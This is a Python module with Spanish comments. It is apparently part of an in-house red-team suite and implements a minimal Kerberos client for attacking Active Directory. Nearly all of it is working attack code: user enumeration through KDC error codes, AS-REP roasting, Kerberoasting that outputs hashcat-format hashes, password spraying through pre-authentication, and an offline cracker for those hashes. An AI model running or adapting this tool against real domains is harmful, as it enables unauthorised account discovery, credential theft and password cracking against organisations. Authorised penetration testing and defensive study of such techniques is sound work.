# -*- coding: utf-8 -*-
"""
core.krb5
=========
Cliente Kerberos mínimo (RFC 4120) escrito a mano y sin dependencias,
inspirado en el motor Kerberos de «goteo» (suite red team propia).

Proporciona:
    • Codificador DER mínimo (enteros, octetos, bitstrings, secuencias…).
    • Construcción de AS-REQ con o sin PA-ENC-TIMESTAMP.
    • Envío al KDC por UDP/TCP 88 y lectura de la respuesta.
    • Interpretación de KRB-ERROR / AS-REP (enumeración de usuarios y
      AS-REP roasting → formato hashcat -m 18200).
    • Criptografía RC4-HMAC (RFC 4757) + MD4 puro para el NT-hash,
      necesarios para el *password spray* por preautenticación Kerberos.

Solo cubre el subconjunto estricto que usan los módulos ad/kerberos_*,
ad/asreproast, ad/passwd_spray y ad/kerberoast. No implementa delegación
constrained ni PKINIT.
"""

import hashlib
import hmac
import os
import socket
import struct
from datetime import datetime, timezone

# ---------------------------------------------------------------------------
# Códigos de error KDC (RFC 4120 §7.5.9) con traducción operacional
# ---------------------------------------------------------------------------
KDC_ERR_C_PRINCIPAL_UNKNOWN = 6   # usuario no existe
KDC_ERR_CLIENT_REVOKED = 18       # cuenta bloqueada / deshabilitada / caducada
KDC_ERR_PREAUTH_FAILED = 24       # usuario válido, clave incorrecta
KDC_ERR_PREAUTH_REQUIRED = 25     # usuario válido, exige preautenticación

MOTIVOS = {
    6: "usuario desconocido",
    14: "etype no soportado",
    18: "cuenta bloqueada/deshabilitada",
    24: "clave incorrecta (preauth fallida)",
    25: "usuario válido (requiere preautenticación)",
}

TIEMPO_LEJANO = "20370913024805Z"  # till clásico de los AS-REQ de enumeración


# ===========================================================================
# DER mínimo (codificador + lector)
# ===========================================================================
def _longitud(n: int) -> bytes:
    """Codifica una longitud DER (corta o larga)."""
    if n < 0x80:
        return bytes([n])
    cuerpo = n.to_bytes((n.bit_length() + 7) // 8, "big")
    return bytes([0x80 | len(cuerpo)]) + cuerpo


def tlv(etiqueta: int, cuerpo: bytes) -> bytes:
    """Construye un TLV completo (tag + longitud + valor)."""
    return bytes([etiqueta]) + _longitud(len(cuerpo)) + cuerpo


def der_entero(valor: int) -> bytes:
    """INTEGER universal (0x02) con el mínimo de bytes con signo."""
    if valor == 0:
        return tlv(0x02, b"\x00")
    cuerpo = valor.to_bytes((valor.bit_length() + 8) // 8, "big")
    return tlv(0x02, cuerpo)


def der_enumerado(valor: int) -> bytes:
    return tlv(0x0A, der_entero(valor)[2:])


def der_octetos(datos: bytes) -> bytes:
    return tlv(0x04, datos)


def der_bits(datos: bytes) -> bytes:
    """BIT STRING universal (0x03) con los bits no usados a 0."""
    return tlv(0x03, b"\x00" + datos)


def der_cadena(texto: str) -> bytes:
    """GeneralString (0x1B) — el tipo de KerberosString en RFC 4120."""
    return tlv(0x1B, texto.encode("utf-8"))


def der_secuencia(*partes: bytes) -> bytes:
    return tlv(0x30, b"".join(partes))


def ctx_prim(n: int, cuerpo: bytes) -> bytes:
    """Tag de contexto PRIMITIVO [n] (0x80|n)."""
    return tlv(0x80 | n, cuerpo)


def ctx_cons(n: int, cuerpo: bytes) -> bytes:
    """Tag de contexto CONSTRUIDO [n] (0xA0|n)."""
    return tlv(0xA0 | n, cuerpo)


def leer_tlv(datos: bytes, offset: int = 0):
    """Lee un TLV. Devuelve (etiqueta, cuerpo, offset_siguiente)."""
    etiqueta = datos[offset]
    offset += 1
    largo = datos[offset]
    offset += 1
    if largo & 0x80:
        n = largo & 0x7F
        largo = int.from_bytes(datos[offset:offset + n], "big")
        offset += n
    return etiqueta, datos[offset:offset + largo], offset + largo


def hijos(cuerpo: bytes):
    """Itera los hijos TLV de un elemento construido."""
    out, pos = [], 0
    while pos < len(cuerpo):
        etiqueta, contenido, pos = leer_tlv(cuerpo, pos)
        out.append((etiqueta, contenido))
    return out


def _valor_entero(cuerpo: bytes) -> int:
    return int.from_bytes(cuerpo, "big", signed=True) if cuerpo else 0


def _desenvolver(contenido: bytes) -> bytes:
    """Kerberos usa EXPLICIT TAGS: los campos de contexto envuelven el TLV
    universal completo (p. ej. 86 03 02 01 19). Esta función devuelve el
    contenido del TLV interno si la forma es explícita, o el propio dato si
    llegó en forma primitiva directa (tolerancia a implementaciones)."""
    if not contenido:
        return contenido
    try:
        tag, interno, siguiente = leer_tlv(contenido)
    except (IndexError, ValueError):
        return contenido
    if siguiente == len(contenido) and tag in (0x02, 0x04, 0x03, 0x0A, 0x18, 0x1B):
        return interno
    return contenido


# ===========================================================================
# Criptografía: MD4, RC4 y RC4-HMAC (RFC 4757)
# ===========================================================================
def md4(datos: bytes) -> bytes:
    """MD4 puro (RFC 1320). OpenSSL 3 ya no expone MD4 y el NT-hash lo necesita."""
    def rotl(x, n):
        return ((x << n) | (x >> (32 - n))) & 0xFFFFFFFF

    M = 0xFFFFFFFF
    h = [0x67452301, 0xEFCDAB89, 0x98BADCFE, 0x10325476]
    msg = bytearray(datos)
    msg.append(0x80)
    while len(msg) % 64 != 56:
        msg.append(0)
    msg += struct.pack("<Q", len(datos) * 8)

    def ronda(a, b, c, d, xs, orden, f, turnos, k=0):
        for i, idx in enumerate(orden):
            ciclo = i % 4
            if ciclo == 0:
                a = rotl((a + f(b, c, d) + xs[idx] + k) & M, turnos[i % 4])
            elif ciclo == 1:
                d = rotl((d + f(a, b, c) + xs[idx] + k) & M, turnos[i % 4])
            elif ciclo == 2:
                c = rotl((c + f(d, a, b) + xs[idx] + k) & M, turnos[i % 4])
            else:
                b = rotl((b + f(c, d, a) + xs[idx] + k) & M, turnos[i % 4])
        return a, b, c, d

    f1 = lambda x, y, z: (x & y) | (~x & z)            # noqa: E731
    f2 = lambda x, y, z: (x & y) | (x & z) | (y & z)   # noqa: E731
    f3 = lambda x, y, z: x ^ y ^ z                     # noqa: E731
    orden2 = [0, 4, 8, 12, 1, 5, 9, 13, 2, 6, 10, 14, 3, 7, 11, 15]
    orden3 = [0, 8, 4, 12, 2, 10, 6, 14, 1, 9, 5, 13, 3, 11, 7, 15]

    for off in range(0, len(msg), 64):
        x = struct.unpack("<16I", bytes(msg[off:off + 64]))
        a, b, c, d = h
        a, b, c, d = ronda(a, b, c, d, x, range(16), f1, [3, 7, 11, 19])
        a, b, c, d = ronda(a, b, c, d, x, orden2, f2, [3, 5, 9, 13], 0x5A827999)
        a, b, c, d = ronda(a, b, c, d, x, orden3, f3, [3, 9, 11, 15], 0x6ED9EBA1)
        h = [(h[0] + a) & M, (h[1] + b) & M, (h[2] + c) & M, (h[3] + d) & M]
    return struct.pack("<4I", *h)


def clave_nt(contrasena: str) -> bytes:
    """NT-hash: MD4 de la contraseña en UTF-16LE (base de RC4-HMAC etype 23)."""
    return md4(contrasena.encode("utf-16-le"))


def rc4(clave: bytes, datos: bytes) -> bytes:
    """RC4 puro (cifrador de flujo simétrico)."""
    caja = list(range(256))
    j = 0
    for i in range(256):
        j = (j + caja[i] + clave[i % len(clave)]) & 0xFF
        caja[i], caja[j] = caja[j], caja[i]
    salida = bytearray()
    i = j = 0
    for byte in datos:
        i = (i + 1) & 0xFF
        j = (j + caja[i]) & 0xFF
        caja[i], caja[j] = caja[j], caja[i]
        salida.append(byte ^ caja[(caja[i] + caja[j]) & 0xFF])
    return bytes(salida)


def _hmac_md5(clave: bytes, datos: bytes) -> bytes:
    return hmac.new(clave, datos, hashlib.md5).digest()


def cifrar_rc4_hmac(clave: bytes, uso: int, datos: bytes) -> bytes:
    """RC4-HMAC (RFC 4757): checksum(16) || RC4(K3, datos)."""
    k1 = _hmac_md5(clave, struct.pack("<I", uso))
    checksum = _hmac_md5(k1, datos)
    k3 = _hmac_md5(k1, checksum)
    return checksum + rc4(k3, datos)


# ===========================================================================
# Construcción de AS-REQ
# ===========================================================================
def _principal(nombre: str) -> bytes:
    """PrincipalName: SEQUENCE { name-type [0], name-string [1] SEQ OF }."""
    cadenas = [der_cadena(p) for p in nombre.split("/")]
    return der_secuencia(ctx_prim(0, der_entero(1)),
                         ctx_cons(1, der_secuencia(*cadenas)))


def _sello_tiempo(contrasena: str) -> bytes:
    """PA-DATA PA-ENC-TIMESTAMP (tipo 2) cifrado con RC4-HMAC(uso 8)."""
    ahora = datetime.now(timezone.utc).strftime("%Y%m%d%H%M%SZ")
    llano = der_secuencia(ctx_prim(0, der_cadena(ahora)))
    cifrado = cifrar_rc4_hmac(clave_nt(contrasena), 8, llano)
    pa = der_secuencia(ctx_prim(1, der_entero(2)), ctx_prim(2, der_octetos(cifrado)))
    return pa


def construir_as_req(cname: str, reino: str, etipo: int = 23,
                     con_preauth: bool = False, contrasena: str = "",
                     hasta: str = TIEMPO_LEJANO) -> bytes:
    """Construye un AS-REQ (APPLICATION 10).

    con_preauth=False → AS-REQ clásico de enumeración / AS-REP roasting.
    con_preauth=True  → incluye PA-ENC-TIMESTAMP (password spray).
    """
    cuerpo = der_secuencia(
        ctx_prim(0, der_bits(struct.pack(">I", 0x50800000))),  # KDCOptions
        ctx_cons(1, _principal(cname)),
        ctx_prim(2, der_cadena(reino)),
        ctx_cons(3, _principal("krbtgt/" + reino)),
        ctx_prim(5, der_cadena(hasta)),
        ctx_prim(7, der_entero(int.from_bytes(os.urandom(4), "big") & 0x7FFFFFFF)),
        ctx_cons(8, der_secuencia(der_entero(etipo))),
    )
    pares = [ctx_prim(1, der_entero(5)), ctx_prim(2, der_entero(10))]
    if con_preauth:
        pares.append(ctx_cons(3, der_secuencia(_sello_tiempo(contrasena))))
    pares.append(ctx_cons(4, cuerpo))
    return tlv(0x6A, der_secuencia(*pares))  # [APPLICATION 10]


# ===========================================================================
# Red: envío al KDC (UDP/TCP 88)
# ===========================================================================
def _recibir_exacto(sock, n: int) -> bytes:
    trozos = bytearray()
    while len(trozos) < n:
        trozo = sock.recv(n - len(trozos))
        if not trozo:
            break
        trozos.extend(trozo)
    return bytes(trozos)


def enviar_kdc(host: str, paquete: bytes, timeout: int = 5, tcp: bool = False,
               puerto: int = 88) -> bytes:
    """Envía el AS-REQ al KDC y devuelve la respuesta cruda (sin prefijo TCP)."""
    tipo = socket.SOCK_STREAM if tcp else socket.SOCK_DGRAM
    sock = socket.socket(socket.AF_INET, tipo)
    sock.settimeout(timeout)
    try:
        if tcp:
            sock.connect((host, puerto))
            sock.sendall(struct.pack(">I", len(paquete)) + paquete)
            cab = _recibir_exacto(sock, 4)
            largo = struct.unpack(">I", cab)[0]
            respuesta = _recibir_exacto(sock, largo)
        else:
            sock.sendto(paquete, (host, puerto))
            respuesta, _ = sock.recvfrom(65535)
    finally:
        sock.close()
    return respuesta


# ===========================================================================
# Interpretación de respuestas
# ===========================================================================
def interpretar_respuesta(datos: bytes, cname: str = "", reino: str = "") -> dict:
    """Clasifica la respuesta del KDC.

    Devuelve un dict con:
        tipo     : "error" | "asrep" | "desconocido"
        codigo   : error-code (solo en errores)
        motivo   : texto legible
        hash     : cadena hashcat -m 18200 (solo en AS-REP con etype 23)
        etipo    : etype del enc-part (solo AS-REP)
    """
    if not datos:
        return {"tipo": "desconocido", "motivo": "respuesta vacía"}
    etiqueta = datos[0]

    if etiqueta == 0x7E:  # KRB-ERROR [APPLICATION 30]
        _, tlv_seq, _ = leer_tlv(datos)
        _, cuerpo_seq, _ = leer_tlv(tlv_seq)          # desenvuelve la SEQUENCE
        codigo = None
        for tag, contenido in hijos(cuerpo_seq):
            if tag == 0x86:                      # error-code [6]
                codigo = _valor_entero(_desenvolver(contenido))
                break
        return {"tipo": "error", "codigo": codigo,
                "motivo": MOTIVOS.get(codigo, f"error KDC {codigo}")}

    if etiqueta == 0x6B:  # AS-REP [APPLICATION 11]
        _, tlv_seq, _ = leer_tlv(datos)
        _, cuerpo_seq, _ = leer_tlv(tlv_seq)          # desenvuelve la SEQUENCE
        enc = {}
        for tag, contenido in hijos(cuerpo_seq):
            if tag == 0xA6:                      # enc-part [6]
                _, enc_body, _ = leer_tlv(contenido)   # desenvuelve SEQUENCE
                for t2, c2 in hijos(enc_body):
                    if t2 == 0x80:               # etype [0]
                        enc["etipo"] = _valor_entero(_desenvolver(c2))
                    elif t2 == 0x82:             # cipher [2]
                        enc["cipher"] = _desenvolver(c2)
        hexa = enc.get("cipher", b"").hex()
        usuario = cname or "(usuario)"
        hash_hc = f"$krb5asrep${enc.get('etipo', 23)}${usuario}@{reino}:{hexa[:32]}${hexa[32:]}"
        return {"tipo": "asrep", "hash": hash_hc, "etipo": enc.get("etipo", 23),
                "motivo": "AS-REP recibido (sin preautenticación)"}

    return {"tipo": "desconocido", "motivo": "respuesta KDC no reconocida"}


# ===========================================================================
# TGS-REQ (kerberoasting): TGT con preauth -> AP-REQ -> TGS-REQ
# ===========================================================================
USO_AS_REP = (8, 3)   # Microsoft sella el enc-part del AS-REP con uso 8 (RC4)
USO_AUTHENTICATOR = 7
USO_TGS_REP = 2


def descifrar_rc4_hmac(clave: bytes, usos, datos: bytes):
    """Descifra un EncryptedData RC4-HMAC probando varios key-usage.

    Devuelve (plaintext, uso_valido) o (None, None) si ningún uso verifica
    el checksum HMAC — lo que a efectos de crackeo significa clave errónea.
    """
    if not isinstance(usos, (tuple, list)):
        usos = (usos,)
    if len(datos) <= 16:
        return None, None
    checksum, cifrado = datos[:16], datos[16:]
    for uso in usos:
        k1 = _hmac_md5(clave, struct.pack("<I", uso))
        k3 = _hmac_md5(k1, checksum)
        llano = rc4(k3, cifrado)
        if hmac.compare_digest(_hmac_md5(k1, llano), checksum):
            return llano, uso
    return None, None


def _extraer_ticket_asrep(datos: bytes) -> bytes:
    """Devuelve el TLV crudo del Ticket [5] de un AS-REP (para el AP-REQ)."""
    _, tlv_seq, _ = leer_tlv(datos)
    _, cuerpo_seq, _ = leer_tlv(tlv_seq)
    for tag, contenido in hijos(cuerpo_seq):
        if tag == 0xA5:            # ticket [5]
            return contenido       # contenido == TLV completo [APPLICATION 3]
    return b""


def _clave_sesion_asrep(datos: bytes, contrasena: str):
    """Descifra el enc-part del AS-REP y extrae la clave de sesión.

    Devuelve (clave_sesion, kvno) o (None, None) si la contraseña es errónea.
    """
    clave_nt_usuario = clave_nt(contrasena)
    _, tlv_seq, _ = leer_tlv(datos)
    _, cuerpo_seq, _ = leer_tlv(tlv_seq)
    for tag, contenido in hijos(cuerpo_seq):
        if tag != 0xA6:            # enc-part [6]
            continue
        _, enc_body, _ = leer_tlv(contenido)
        etipo, kvno, cifrado = 0, None, b""
        for t2, c2 in hijos(enc_body):
            if t2 == 0x80:
                etipo = _valor_entero(_desenvolver(c2))
            elif t2 == 0x81:
                kvno = _valor_entero(_desenvolver(c2))
            elif t2 == 0x82:
                cifrado = _desenvolver(c2)
        if etipo != 23 or not cifrado:
            return None, None
        llano, _ = descifrar_rc4_hmac(clave_nt_usuario, USO_AS_REP, cifrado)
        if llano is None:
            return None, None
        # El texto claro es un EncASRepPart [APPLICATION 25] (0x79) envolviendo
        # una SEQUENCE — o la SEQUENCE directa según implementación. Se
        # desenvuelve el TLV para iterar sus campos (key [0] EncryptionKey).
        contenido = llano
        if llano and llano[0] in (0x79, 0x7A, 0x30):
            contenido = leer_tlv(llano)[1]
        for t3, c3 in hijos(contenido):
            if t3 == 0xA0:         # key [0]
                _, clave_seq, _ = leer_tlv(c3)          # EncryptionKey SEQ
                ktipo, kvalor = 0, b""
                for t4, c4 in hijos(clave_seq):
                    if t4 == 0x80:
                        ktipo = _valor_entero(_desenvolver(c4))
                    elif t4 == 0x81:
                        kvalor = _desenvolver(c4)
                if ktipo == 23 and kvalor:
                    return kvalor, kvno
        return None, None
    return None, None


def _authenticator_plano(reino: str, cname: str) -> bytes:
    """Authenticator [APPLICATION 2] en claro (se cifra con la clave sesión)."""
    ahora = datetime.now(timezone.utc)
    return der_secuencia(
        ctx_prim(0, der_entero(5)),            # authenticator-vno
        ctx_prim(1, der_cadena(reino)),
        ctx_cons(2, _principal(cname)),
        ctx_prim(4, der_entero(500)),          # cusec
        ctx_prim(5, der_cadena(ahora.strftime("%Y%m%d%H%M%SZ"))),
    )


def construir_tgs_req(reino: str, cname: str, spn: str, ticket: bytes,
                      clave_sesion: bytes) -> bytes:
    """Construye un TGS-REQ [APPLICATION 12] con PA-TGS-REQ (kerberoasting)."""
    authenticator = der_secuencia(             # EncryptedData del authenticator
        ctx_prim(0, der_entero(23)),           # etype RC4
        ctx_prim(2, der_octetos(cifrar_rc4_hmac(
            clave_sesion, USO_AUTHENTICATOR,
            _authenticator_plano(reino, cname)))),
    )
    ap_req = tlv(0x6E, der_secuencia(          # AP-REQ [APPLICATION 14]
        ctx_prim(0, der_entero(5)),            # pvno
        ctx_prim(1, der_entero(14)),           # msg-type
        ctx_prim(2, der_bits(struct.pack(">I", 0))),   # ap-options
        ctx_cons(3, ticket),                   # ticket (TLV crudo reutilizado)
        ctx_cons(4, authenticator),
    ))
    pa = der_secuencia(ctx_prim(1, der_entero(1)),      # PA-TGS-REQ
                       ctx_prim(2, der_octetos(ap_req)))
    cuerpo = der_secuencia(
        ctx_prim(0, der_bits(struct.pack(">I", 0x50800000))),  # KDCOptions
        ctx_prim(2, der_cadena(reino)),
        ctx_cons(3, _principal(spn)),
        ctx_prim(5, der_cadena(TIEMPO_LEJANO)),
        ctx_prim(7, der_entero(int.from_bytes(os.urandom(4), "big") & 0x7FFFFFFF)),
        ctx_cons(8, der_secuencia(der_entero(23))),
    )
    pares = [ctx_prim(1, der_entero(5)), ctx_prim(2, der_entero(12)),
             ctx_cons(3, der_secuencia(pa)), ctx_cons(4, cuerpo)]
    return tlv(0x6C, der_secuencia(*pares))     # [APPLICATION 12]


def interpretar_tgs_rep(datos: bytes, usuario: str, reino: str, spn: str) -> dict:
    """Clasifica la respuesta del TGS-REQ.

    Devuelve dict con tipo ("tgsrep"|"error"|"desconocido") y, en éxito,
    el hash hashcat -m 13100 ($krb5tgs$23$...).
    """
    if not datos:
        return {"tipo": "desconocido", "motivo": "respuesta vacía"}
    if datos[0] == 0x7E:                        # KRB-ERROR
        _, tlv_seq, _ = leer_tlv(datos)
        _, cuerpo_seq, _ = leer_tlv(tlv_seq)
        codigo = None
        for tag, contenido in hijos(cuerpo_seq):
            if tag == 0x86:
                codigo = _valor_entero(_desenvolver(contenido))
                break
        return {"tipo": "error", "codigo": codigo,
                "motivo": MOTIVOS.get(codigo, f"error KDC {codigo}")}
    if datos[0] == 0x6D:                        # TGS-REP [APPLICATION 13]
        _, tlv_seq, _ = leer_tlv(datos)
        _, cuerpo_seq, _ = leer_tlv(tlv_seq)
        for tag, contenido in hijos(cuerpo_seq):
            if tag == 0xA5:                     # enc-part [5] en TGS-REP
                _, enc_body, _ = leer_tlv(contenido)
                etipo, cifrado = 0, b""
                for t2, c2 in hijos(enc_body):
                    if t2 == 0x80:
                        etipo = _valor_entero(_desenvolver(c2))
                    elif t2 == 0x82:
                        cifrado = _desenvolver(c2)
                if etipo != 23 or not cifrado:
                    return {"tipo": "desconocido",
                            "motivo": f"etype {etipo} no soportado (solo RC4)"}
                hexa = cifrado.hex()
                hash_hc = (f"$krb5tgs${etipo}$*{usuario}${reino}${spn}*"
                           f"${hexa[:32]}${hexa[32:]}")
                return {"tipo": "tgsrep", "hash": hash_hc, "etipo": etipo,
                        "motivo": "TGS-REP recibido (kerberoastable)"}
        return {"tipo": "desconocido", "motivo": "TGS-REP sin enc-part"}
    return {"tipo": "desconocido", "motivo": "respuesta KDC no reconocida"}


def obtener_tgs(host: str, usuario: str, contrasena: str, reino: str,
                spn: str, timeout: int = 5, tcp: bool = True,
                puerto: int = 88) -> dict:
    """Flujo kerberoast completo: TGT (preauth) -> TGS-REQ -> hash 13100.

    Devuelve el mismo dict que interpretar_tgs_rep, más "fase" con el
    paso que falló si la contraseña es incorrecta o el KDC responde error.
    """
    # 1) TGT con preautenticación
    as_req = construir_as_req(usuario, reino, etipo=23, con_preauth=True,
                              contrasena=contrasena)
    as_rep = enviar_kdc(host, as_req, timeout=timeout, tcp=tcp, puerto=puerto)
    clasif = interpretar_respuesta(as_rep, usuario, reino)
    if clasif["tipo"] == "error":
        return {"tipo": "error", "fase": "asreq",
                "codigo": clasif.get("codigo"),
                "motivo": f"TGT: {clasif['motivo']}"}
    if clasif["tipo"] != "asrep":
        return {"tipo": "desconocido", "fase": "asreq",
                "motivo": "el KDC no devolvió un AS-REP"}

    # 2) Clave de sesión del AS-REP (verifica la contraseña)
    clave_sesion, _ = _clave_sesion_asrep(as_rep, contrasena)
    if clave_sesion is None:
        return {"tipo": "error", "fase": "asreq",
                "motivo": "contraseña incorrecta (el enc-part no descifra)"}
    ticket = _extraer_ticket_asrep(as_rep)
    if not ticket:
        return {"tipo": "desconocido", "fase": "asrep",
                "motivo": "AS-REP sin ticket"}

    # 3) TGS-REQ del servicio
    tgs_req = construir_tgs_req(reino, usuario, spn, ticket, clave_sesion)
    tgs_rep = enviar_kdc(host, tgs_req, timeout=timeout, tcp=tcp, puerto=puerto)
    resultado = interpretar_tgs_rep(tgs_rep, usuario, reino, spn)
    resultado.setdefault("fase", "tgsreq")
    return resultado


# ===========================================================================
# Crackeo OFFLINE de hashes kerberos (18200 / 13100) — puro Python
# ===========================================================================
def verificar_hash_kerberos(hash_str: str, contrasena: str):
    """Comprueba una contraseña contra un hash hashcat 18200 o 13100.

    Devuelve True si la contraseña produce el checksum del enc-part.
    Solo hashes etype 23 (RC4-HMAC) — el formato de hashcat guarda el
    checksum como los primeros 32 hex y el resto del cifrado tras ':'.
    """
    if not hash_str.startswith("$krb5"):
        return False
    clave = clave_nt(contrasena)
    try:
        if hash_str.startswith("$krb5asrep$"):
            # formato hashcat: $krb5asrep$23$user@REALM:checksum$cifrado
            partes = hash_str.split("$")
            hexa = partes[3].split(":", 1)[1] + partes[4]
            usos = USO_AS_REP
        elif hash_str.startswith("$krb5tgs$"):
            # formato hashcat: $krb5tgs$23$*user$realm$spn*$checksum$cifrado
            # (el primer *$ cierra el prefijo "$23$"; el segundo abre el hex)
            trozos = hash_str.split("*$")
            hexa = trozos[-1].replace("$", "")
            usos = (USO_TGS_REP,)
        else:
            return False
        datos = bytes.fromhex(hexa)
    except (IndexError, ValueError):
        return False
    llano, _ = descifrar_rc4_hmac(clave, usos, datos)
    return llano is not None


def crackear_hashes_kerberos(hashes, candidatos):
    """Prueba una lista de contraseñas contra hashes 18200/13100 (offline).

    Devuelve {hash: contraseña} solo para los que coinciden.
    """
    crakeados = {}
    for hash_str in hashes:
        for cand in candidatos:
            if cand and verificar_hash_kerberos(hash_str, cand):
                crakeados[hash_str] = cand
                break
    return crakeados
